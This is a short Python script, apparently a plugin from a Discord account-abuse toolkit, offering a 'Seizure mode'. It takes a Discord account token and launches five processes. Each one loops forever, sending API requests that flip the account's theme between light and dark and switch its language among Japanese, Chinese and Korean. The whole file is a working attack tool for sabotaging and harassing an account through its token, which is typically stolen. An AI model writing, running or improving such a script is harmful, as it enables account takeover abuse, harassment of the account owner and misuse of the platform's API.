import random

import requests
from colorama import Fore

from util.plugins.common import *


def StartSeizure(token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)


def Seizure():
    XTitle("Seizure mode")
    token = input(f'{Fore.RED} <~> Token: {Fore.BLUE}')
    CheckToken(token)
    print(f'{Fore.RED} <*> Starting seizure mode {Fore.BLUE}(Switching on/off Light/dark mode)\n')
    processes = []
    threads = 5
    for i in range(threads):
        t = multiprocessing.Process(target=StartSeizure, args=(token,))
        t.start()
        processes.append(t)